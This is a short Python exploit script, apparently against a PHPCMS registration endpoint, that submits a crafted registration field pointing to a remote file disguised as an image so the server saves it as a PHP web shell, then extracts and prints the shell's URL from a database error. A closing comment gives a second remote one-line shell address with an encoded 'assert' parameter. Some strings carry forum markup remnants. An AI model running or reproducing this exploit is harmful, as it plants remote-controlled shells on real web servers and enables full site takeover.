# -*- coding:utf-8 -*-
import requests
import sys
from random import Random
chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'
def main():
    if len(sys.argv) < 2:
        print("[*]Usage   : Python 1.py [url]http://xxx.com[/url]")
        sys.exit()
    host = sys.argv[1]
    url = host + "/index.php?m=member&c=index&a=register&siteid=1"
    data = {
        "siteid": "1",
        "modelid": "1",
        "username": "dsakkfaffdssdudi",
        "password": "123456",
        "email": "dsakkfddsjdi@qq.com",
        "info[content]": "<img src=http://www.bugku.com/tools/phpyijuhua.txt?.php#.jpg>",
        "dosubmit": "1",
        "protocol": "",
    }
    try:
        rand_name = chars[Random().randint(0, len(chars) - 1)]
        data["username"] = "akkuman_%s" % rand_name
        data["email"] = "akkuman_%[email]s@qq.com[/email]" % rand_name
         
        htmlContent = requests.post(url, data=data)
        successUrl = ""
        if "MySQL Error" in htmlContent.text and "http" in htmlContent.text:
            successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php"
            print("[*]Shell  : %s" % successUrl)
        if successUrl == "":
            print("[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n")
    except:
        print("Request Error")
if __name__ == '__main__':
    main()
#如果想使用回调的可以使用[url]http://file.codecat.one/oneword.txt[/url]，一句话地址为.php后面加上e=YXNzZXJ0
